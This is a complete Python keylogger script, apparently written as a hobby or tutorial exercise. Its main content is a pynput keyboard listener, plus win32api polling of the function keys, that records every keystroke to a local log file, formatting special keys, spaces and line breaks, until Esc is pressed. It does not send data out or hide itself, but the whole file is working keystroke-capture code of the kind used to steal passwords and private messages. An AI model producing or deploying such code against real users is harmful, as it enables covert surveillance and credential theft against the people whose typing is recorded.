import win32api
from pynput.keyboard import Key, Listener       # Import required libraries

count = 0           # Keep count of keys pressed
keys = []           # List of keys pressed which will be later printed in log


def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print(f"{key} pressed ")        # Used while debugging for readability

    # Save keywords after every particular number (count)
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    special_keys = ['shift', 'alt', 'ctrl', 'caps_lock', 'tab']  # list of special keys

    with open("keylogger_log.txt", "a+") as f:
        for key in keys:
            k = str(key).replace("'", "")       # Replace ' ' with spaces for readability

            # Check if key is a special key
            if any(s in k for s in special_keys):
                f.write(f"\t{key} ")

            elif k.find("space") > 0:       # For Space leave actual space
                f.write(" ")

            elif k.find("enter") > 0:       # For Enter goto newline
                f.write("\n")

            elif k.find("Key") == -1:       # For any key not found
                f.write(k)


            # List of virtual key codes for F1 through F12 keys
            f_keys = [0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B]

            # Check for F1 through F12 keys
            for vk_code in f_keys:
                if win32api.GetAsyncKeyState(vk_code) & 1:
                    f.write(f"[F{f_keys.index(vk_code) + 1}]")


def on_release(key):
    if key == Key.esc:
        print("\nEsc key was pressed!\n")     # Used for checking while debugging (Can Comment Out Later)

        with open("keylogger_log.txt", "a") as f: f.write("\nEsc key was pressed!\n\n")
        return False                    # Show end of log when ESC key is pressed
    else:
        return True


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()             # Keep it working until Esc key is pressed